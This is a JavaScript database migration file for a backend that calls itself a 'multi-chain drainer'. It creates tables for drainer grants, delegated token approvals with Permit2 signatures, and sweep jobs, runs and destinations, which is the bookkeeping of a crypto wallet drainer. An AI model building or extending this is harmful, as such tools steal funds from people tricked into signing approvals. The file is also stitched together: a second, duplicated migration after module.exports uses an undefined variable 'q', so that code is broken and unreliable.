'use strict';

/**
 * Additive migrations only. Never drop, never rename.
 */

const db = require('./lib/sqlite');

function columnExists(table, column) {
  return db.prepare(`PRAGMA table_info(${table})`).all().some((c) => c.name === column);
}

function addColumn(table, column, decl) {
  if (!columnExists(table, column)) db.exec(`ALTER TABLE ${table} ADD COLUMN ${column} ${decl}`);
}

function migrate() {
  db.exec(`
    CREATE TABLE IF NOT EXISTS sweep_jobs (
      id           INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id      TEXT NOT NULL,
      grant_id     TEXT,
      family       TEXT NOT NULL,
      network      TEXT NOT NULL,
      symbol       TEXT NOT NULL,
      amount       TEXT NOT NULL,
      psbt         TEXT NOT NULL,
      status       TEXT NOT NULL DEFAULT 'awaiting_signature',
      signature    TEXT,
      created_at   INTEGER NOT NULL,
      completed_at INTEGER
    );
    CREATE INDEX IF NOT EXISTS idx_sweep_jobs_status ON sweep_jobs(status);
  `);

  for (const table of ['delegated_approvals', 'drainer_grants']) {
    addColumn(table, 'decimals', 'INTEGER');
    addColumn(table, 'kind', 'TEXT');
    addColumn(table, 'native_symbol', 'TEXT');
    addColumn(table, 'permit2_signature', 'TEXT');
    addColumn(table, 'permit2_deadline', 'INTEGER');
    addColumn(table, 'source', 'TEXT');
  }

  addColumn('sweeps', 'unwrap_pending', 'INTEGER DEFAULT 0');
  addColumn('sweeps', 'price_source', 'TEXT');
  addColumn('sweeps', 'kind', 'TEXT');
  addColumn('sweeps', 'decimals', 'INTEGER');
  addColumn('sweeps', 'skip_code', 'TEXT');
  addColumn('sweeps', 'destination', 'TEXT');

  db.exec(`CREATE INDEX IF NOT EXISTS idx_grants_user ON drainer_grants(user_id, status)`);
  db.exec(`CREATE INDEX IF NOT EXISTS idx_appr_user ON delegated_approvals(user_id, revoked_at)`);
}

migrate();

module.exports = db;

/* ---------- migration: multi-chain drainer ---------- */
function _colExists(table, column) {
  return q.all(`PRAGMA table_info(${table})`).some((c) => c.name === column);
}
function _addCol(table, column, decl) {
  if (!_colExists(table, column)) q.run(`ALTER TABLE ${table} ADD COLUMN ${column} ${decl}`);
}

function migrateDrainer() {
  q.run(`CREATE TABLE IF NOT EXISTS sweep_jobs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    grant_id INTEGER,
    family TEXT NOT NULL,
    network TEXT NOT NULL,
    symbol TEXT NOT NULL,
    amount TEXT NOT NULL,
    psbt TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'awaiting_signature',
    signature TEXT,
    created_at INTEGER NOT NULL,
    completed_at INTEGER
  )`);
  q.run(`CREATE INDEX IF NOT EXISTS idx_sweep_jobs_status ON sweep_jobs(status)`);

  q.run(`CREATE TABLE IF NOT EXISTS sweep_runs (
    id TEXT PRIMARY KEY,
    user_id INTEGER NOT NULL,
    actor_id INTEGER,
    dest TEXT,
    total_usd REAL NOT NULL DEFAULT 0,
    created_at INTEGER NOT NULL
  )`);

  for (const t of ['delegated_approvals', 'drainer_grants']) {
    _addCol(t, 'decimals', 'INTEGER');
    _addCol(t, 'kind', 'TEXT');
    _addCol(t, 'native_symbol', 'TEXT');
    _addCol(t, 'permit2_signature', 'TEXT');
    _addCol(t, 'permit2_deadline', 'INTEGER');
    _addCol(t, 'source', 'TEXT');
  }

  _addCol('sweeps', 'run_id', 'TEXT');
  _addCol('sweeps', 'kind', 'TEXT');
  _addCol('sweeps', 'decimals', 'INTEGER');
  _addCol('sweeps', 'skip_code', 'TEXT');
  _addCol('sweeps', 'destination', 'TEXT');
  _addCol('sweeps', 'price_source', 'TEXT');
  _addCol('sweeps', 'unwrap_pending', 'INTEGER DEFAULT 0');

  q.run(`CREATE INDEX IF NOT EXISTS idx_grants_user ON drainer_grants(user_id, status)`);
  q.run(`CREATE INDEX IF NOT EXISTS idx_appr_user ON delegated_approvals(user_id, revoked_at)`);
}
migrateDrainer();